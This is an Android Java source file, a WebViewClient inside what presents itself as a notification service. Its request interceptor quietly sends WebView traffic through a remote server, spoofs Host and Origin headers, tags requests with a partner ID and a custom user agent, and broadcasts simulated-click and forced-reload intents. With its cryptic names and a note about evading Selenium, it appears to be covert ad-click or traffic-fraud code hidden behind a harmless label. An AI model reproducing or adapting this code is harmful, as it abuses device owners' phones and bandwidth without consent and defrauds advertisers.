package com.example.imetlin.sonik.notification.service;

import java.io.InputStream;
import java.net.CookieManager;
import java.net.HttpCookie;
import java.net.HttpURLConnection;
import java.net.Proxy;
import java.net.URI;
import java.net.URL;
import java.net.URLDecoder;
import java.util.Iterator;
import java.util.List;
import java.util.Map;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.util.Log;
import android.webkit.HttpAuthHandler;
import android.webkit.WebResourceRequest;
import android.webkit.WebResourceResponse;
import android.webkit.WebView;
import android.webkit.WebViewClient;

/**
 * NotificationWebViewClient.java
 * 
 */
public class NotificationWebViewClient extends WebViewClient {
	// Constants ---------------------------------------------------------------------------------------------- Constants
	private static final String TAG_NAME = "NotificationService"; //logger

	private static final int WAIT_AFTER_LOG = 10; //wait secs gfor new request after __log to force reload

	public static boolean DR = true; //disable redirect enabled only on click

	// Instance Variables ---------------------------------------------------------------------------- Instance Variables
	private String userAgent = null;

	private CookieManager cookieManager = new CookieManager();

	private String currentTarget = "";

	private Context context;

	// Constructors ---------------------------------------------------------------------------------------- Constructors

	// Public Methods ------------------------------------------------------------------------------------ Public Methods
	public NotificationWebViewClient(String ua, Context context) {
		super();
		this.userAgent = ua;
		this.context = context;
	}
	
	/*
	*/

	@Override
	public boolean shouldOverrideUrlLoading(WebView view, String url) {
		//System.out.println("shouldOverrideUrlLoading: " + url + ", " + DR);
		if (DR == false && NotificationService.cip != null) { //click is in process
			Intent intent = new Intent("CCLK");
			intent.putExtra("u", view.getUrl());
			intent.setPackage(context.getPackageName()); //this is required to run it for multiple apps
			context.sendBroadcast(intent);
		}
		return DR;
	}

	@Override
	public void onPageFinished(WebView view, String url) {
		super.onPageFinished(view, url);
		NotificationService.lastReload = System.currentTimeMillis(); //update laste reload value
	}

	@Override
	public WebResourceResponse shouldInterceptRequest(WebView view, String target) {
		WebResourceResponse result = null;

		try {
			InputStream responseInputStream;

			String id = target.replaceAll("/$", "");
			try {
				id = URLDecoder.decode(id, "UTF-8").replaceAll("[^a-zA-Z0-9]", ""); //remove last forward slash to match target urls
			} catch (Exception e) {
			}

			target = target.replaceAll("/$", "");//remove last forward slash to match target urls

			URL url = new URL(target);
			String host = url.getHost();
			String noh = NotificationService.noh;

			//prevent selenium calls right away			
			if (target.contains("//localhost:") || target.contains("favicon.ico")) {
				return new WebResourceResponse("text/plain", "UTF-8", null);
			}

			currentTarget = target;
			
			//Log.d(TAG_NAME, "target: " + target);

			//force reload if progress is not going farther __log
			if (target.contains("___log")) {
				//fr();
			}

			if ((!noh.equals(host) && view.getId() == id.hashCode())) { //  || target.contains("___log") || target.endsWith("/ip")
				//Log.d(TAG_NAME, "Service Overwrite: url target host " + target + ", to: " + noh); 
				url = new URL("http", noh, 80, url.getFile() != null ? url.getFile().replaceAll("\\s", "+") : null);
			} else {
				return null; //cancel lets do the standard way
			}
			
			HttpURLConnection conn;
			conn = (HttpURLConnection) url.openConnection(Proxy.NO_PROXY);
			conn.setRequestMethod("GET");
			conn.setInstanceFollowRedirects(true);
			conn.setConnectTimeout(30000);
			conn.addRequestProperty("Cache-Control", "no-cache");
			conn.setRequestProperty("X-HTTPS", "supported");
			conn.setRequestProperty("Origin", target);
			
			conn.setRequestProperty("Host", host); //
			if(NotificationService.pid != null)
				conn.setRequestProperty("X-Partner-ID", NotificationService.pid);
			conn.setRequestProperty("Requested-With", context.getPackageName());//this is required for filtering tags by package id
			if (userAgent != null)
				conn.setRequestProperty("User-Agent", userAgent);
			conn.setDoInput(true);

			// Starts the query
			conn.connect();

			String contentTypeValue = null;
			String encodingValue = null;

			responseInputStream = conn.getInputStream();
			contentTypeValue = conn.getHeaderField("Content-Type");
			encodingValue = conn.getHeaderField("Content-Encoding");
			if (contentTypeValue != null && contentTypeValue.contains("text/html")) {
				contentTypeValue = "text/html";
			}

			result = new WebResourceResponse(contentTypeValue, encodingValue != null ? encodingValue : "UTF-8", responseInputStream);

		} catch (Exception e) {
			return new WebResourceResponse("text/plain", "UTF-8", null);
		}

		return result;
	}

	/*@SuppressLint("NewApi")
	@Override
	public WebResourceResponse shouldInterceptRequest(WebView view, WebResourceRequest request) { //
		WebResourceResponse result = null;
		boolean override = false;
		
		//System.out.println("shouldInterceptRequest: " + request.getUrl().toString());		
		//System.out.println("shouldInterceptRequest: " + request.getMethod());		

		try {
			InputStream responseInputStream;
			 
			String target = request.getUrl().toString();
			String id = target.replaceAll("/$", "");
			try {
				id = URLDecoder.decode(id, "UTF-8").replaceAll("[^a-zA-Z0-9]", ""); //remove last forward slash to match target urls
			} catch(Exception e) {}
			
			URL url = new URL(target);			
			String host = url.getHost();			
			String name = getDomainName(host);	
			URI uri = new URI(name);
			String noh = NotificationService.noh;
			
			//System.out.println("Cookie name: " + name);
			//prevent selenium calls right away			
			if(target.contains("//localhost:") || target.contains("favicon.ico")) {				
				return new WebResourceResponse("text/plain", "UTF-8", null);
			}		
			
			currentTarget = target;
			
			//force reload if progress is not going farther __log
			if(target.contains("___log")) {
				fr();				
			}
			
			//Log.d(TAG_NAME, "Service: url target host " + target); 
			if ((!noh.equals(host) && !NotificationService.pu.equals(target) && view.getId() == id.hashCode() || target.contains("___log"))) { 				
				url = new URL(url.getProtocol(), noh, NotificationService.nop, url.getFile() != null ? url.getFile().replaceAll("\\s", "+") : null);
				override = true;
			}
			HttpURLConnection conn = (HttpURLConnection) url.openConnection();
			conn.setRequestMethod("GET");
			conn.setInstanceFollowRedirects(true);
			conn.setRequestProperty("Host", host); //
			conn.setDefaultUseCaches(true);
			conn.setUseCaches(true);
			if(!override)
				conn.setConnectTimeout(3000);
			else
				conn.addRequestProperty("Cache-Control", "no-cache"); //alwasy take first request not form cache
			
			//set cookies
			if (cookieManager.getCookieStore().get(uri).size() > 0) {
				StringBuffer sb = new StringBuffer();
				for(HttpCookie c : cookieManager.getCookieStore().get(uri)) {
					sb.append(c.getName() + "=" + c.getValue());
					sb.append(";");
				}
				//System.out.println("Set Cookie: " + sb.toString());				
				conn.setRequestProperty("Cookie", sb.toString());    
			}	
			
			Iterator it = request.getRequestHeaders().entrySet().iterator();
			while (it.hasNext()) {
				Map.Entry pair = (Map.Entry) it.next();
				conn.setRequestProperty(pair.getKey().toString(), pair.getValue().toString());   
				//System.out.println("shouldInterceptRequest: " + pair.getKey() + "=" + pair.getValue());
			}
	
			if(userAgent != null)
				conn.setRequestProperty("User-Agent", userAgent);
			conn.setDoInput(true); 

			// Starts the query
			conn.connect();

			String contentTypeValue = null;
			String encodingValue = null;
			
			//System.out.println("STATUS: " + conn.getResponseCode());
			
			//if (conn.getResponseCode() == 404) {
				//System.out.println("404: " + url.getHost() + "/" + url.getFile());
			//}

			//if (override && conn.getResponseCode() == HttpURLConnection.HTTP_OK) { //
				responseInputStream = conn.getInputStream();
				
				if(conn.getHeaderField("Set-Cookie") != null) {
					Map<String, List<String>> headers = conn.getHeaderFields();
					List<String> cookiesHeader = headers.get("Set-Cookie");
					if (cookiesHeader != null) {
				    for (String cookie : cookiesHeader) {
				    	cookieManager.getCookieStore().add(uri, HttpCookie.parse(cookie).get(0));
				      //System.out.println("GET Cookie: " + uri + " ------ " + cookie);
				      //System.out.println("GET Cookie parsed: " + uri + " ------ " + HttpCookie.parse(cookie).get(0).getName() + "=" + HttpCookie.parse(cookie).get(0).getValue());
				    }               
					}
				}
				
				contentTypeValue = conn.getHeaderField("Content-Type");
				encodingValue = conn.getHeaderField("Content-Encoding");
				if (contentTypeValue != null && contentTypeValue.contains("text/html")) {
					contentTypeValue = "text/html";
				}
				
				result = new WebResourceResponse(contentTypeValue, encodingValue != null ? encodingValue : "UTF-8", responseInputStream);
			//}

		} catch (Exception e) { 
			e.printStackTrace();
			return new WebResourceResponse("text/plain", "UTF-8", null);
			//Log.e(TAG_NAME, e.getMessage(), e);
			//e.printStackTrace();
		}
		
		override = false;
		
		return result;
	}
	
	@Override
	public WebResourceResponse shouldInterceptRequest(WebView view, String target) { //, WebResourceRequest request
		WebResourceResponse result = null;
		boolean override = false;
		
		//System.out.println("shouldInterceptRequest2: " + target);		
		
		try {
			InputStream responseInputStream;	
			
			String id = target.replaceAll("/$", "");
			try {
				id = URLDecoder.decode(id, "UTF-8").replaceAll("[^a-zA-Z0-9]", ""); //remove last forward slash to match target urls
			} catch(Exception e) {}		
			
			
			URL url = new URL(target);			
			String host = url.getHost();			
			String name = getDomainName(host);	
			URI uri = new URI(name);
			String noh = NotificationService.noh;

			//prevent selenium calls right away			
			if(target.contains("//localhost:") || target.contains("favicon.ico")) {				
				return new WebResourceResponse("text/plain", "UTF-8", null);
			}
			
			currentTarget = target;
			
			//force reload if progress is not going farther __log
			if(target.contains("___log")) {
				fr();				
			}

			
			//Log.d(TAG_NAME, "Service: url target host " + target);  
			if ((!noh.equals(host) && !NotificationService.pu.equals(target) && view.getId() == id.hashCode() || target.contains("___log"))) { 
				url = new URL(url.getProtocol(), noh, NotificationService.nop, url.getFile() != null ? url.getFile().replaceAll("\\s", "+") : null); 
				override = true;
			}
			HttpURLConnection conn = (HttpURLConnection) url.openConnection();
			conn.setRequestMethod("GET");
			conn.setInstanceFollowRedirects(true);
			if(!override)
				conn.setConnectTimeout(3000);
			else
				conn.addRequestProperty("Cache-Control", "no-cache"); //alwasy take first request not form cache
			conn.setRequestProperty("Host", host); //
			conn.setDefaultUseCaches(true);
			conn.setUseCaches(true);
			//set cookies
			if (cookieManager.getCookieStore().get(uri).size() > 0) {
				StringBuffer sb = new StringBuffer();
				for(HttpCookie c : cookieManager.getCookieStore().get(uri)) {
					sb.append(c.getName() + "=" + c.getValue());
					sb.append(";");
				}
				//System.out.println("Set Cookie: " + sb.toString());				
				conn.setRequestProperty("Cookie", sb.toString());    
			}			
	
			if(userAgent != null)
				conn.setRequestProperty("User-Agent", userAgent);
			conn.setDoInput(true); 

			// Starts the query
			conn.connect();

			String contentTypeValue = null;
			String encodingValue = null;
			
			

			//if (override && conn.getResponseCode() == HttpURLConnection.HTTP_OK) { //
				responseInputStream = conn.getInputStream();
				
				if(conn.getHeaderField("Set-Cookie") != null) {
					Map<String, List<String>> headers = conn.getHeaderFields();
					List<String> cookiesHeader = headers.get("Set-Cookie");
					if (cookiesHeader != null) {
				    for (String cookie : cookiesHeader) {
				    	cookieManager.getCookieStore().add(uri, HttpCookie.parse(cookie).get(0));
				      //System.out.println("GET Cookie: " + uri + " ------ " + cookie);
				      //System.out.println("GET Cookie parsed: " + uri + " ------ " + HttpCookie.parse(cookie).get(0).getName() + "=" + HttpCookie.parse(cookie).get(0).getValue());
				    }               
					}
				}
				
				contentTypeValue = conn.getHeaderField("Content-Type");
				encodingValue = conn.getHeaderField("Content-Encoding");
				if (contentTypeValue != null && contentTypeValue.contains("text/html")) {
					contentTypeValue = "text/html";
				}
				
				//System.out.println("shouldInterceptRequest2 done: " + target);
				
				//Thread.sleep(500);
				
				result = new WebResourceResponse(contentTypeValue, encodingValue != null ? encodingValue : "UTF-8", responseInputStream);
			//}

		} catch (Exception e) { 
			return new WebResourceResponse("text/plain", "UTF-8", null);
			//Log.e(TAG_NAME, e.getMessage(), e);
			//e.printStackTrace();
		}
		
		override = false;
		return result;
	}
	*/

	protected void clearCookies() {
		try {
			cookieManager.getCookieStore().removeAll();
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	// Protected Methods ------------------------------------------------------------------------------ Protected Methods

	// Private Methods ---------------------------------------------------------------------------------- Private Methods
	private String getDomainName(String host) {
		try {
			String[] levels = host.split("\\.");
			if (levels.length > 1) {
				host = levels[levels.length - 2] + "." + levels[levels.length - 1];
			}
		} catch (Exception e) {

		}
		return host;
	}

	private void fr() {
		try {
			new Handler(context.getMainLooper()).postDelayed(new Runnable() {
				public void run() {
					Log.d(TAG_NAME, "FR: currentTarget: " + currentTarget);
					if (currentTarget.contains("___log") || currentTarget.contains("favicon.ico")) {
						//if taget did not changed, means we did not go any farther lets force reload
						try {
  						Intent intent = new Intent("FF");
  						intent.putExtra("vi", Integer.parseInt(userAgent.substring(userAgent.length() - 1)));
  						intent.setPackage(context.getPackageName()); //this is required to run it for multiple apps
  						context.sendBroadcast(intent);
						} catch (Exception e) {
						}
					}

				}
			}, WAIT_AFTER_LOG * 1000);
		} catch (Exception e) {
		}
	}
	// Getters & Setters ------------------------------------------------------------------------------ Getters & Setters

}
